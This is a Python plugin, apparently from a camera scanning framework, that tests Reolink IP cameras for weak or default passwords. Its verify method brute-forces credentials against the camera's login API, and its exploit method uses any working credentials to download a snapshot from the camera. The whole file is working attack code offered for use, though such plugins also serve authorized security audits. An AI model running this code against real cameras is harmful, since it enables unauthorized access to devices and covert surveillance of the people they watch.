"""Reolink camera weak password check."""
import requests
from loguru import logger
from .base import POCTemplate


class ReolinkWeakPassword(POCTemplate):
    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product.get("reolink", "reolink")
        self.level = POCTemplate.level.medium
        self.desc = "Reolink camera weak/default password"

    def verify(self, ip, port=80):
        headers = {"User-Agent": self.config.user_agent}
        for user in self.config.users:
            for password in self.config.passwords:
                url = (f"http://{ip}:{port}/api.cgi?"
                       f"cmd=Login&user={user}&password={password}")
                try:
                    r = self.session.get(url, headers=headers,
                                         timeout=self.config.timeout, verify=False)
                    if r.status_code == 200:
                        try:
                            data = r.json()
                            if isinstance(data, list) and data[0].get("code") == 0:
                                return ip, str(port), self.product, user, password, self.name
                        except Exception:
                            pass
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        return self._snapshot(
            f"http://{ip}:{port}/cgi-bin/api.cgi?"
            f"cmd=Snap&channel=0&rs=abc&user={user}&password={password}",
            f"{ip}-{port}-{user}-{password}-reolink.jpg")


POCTemplate.register_poc(ReolinkWeakPassword)
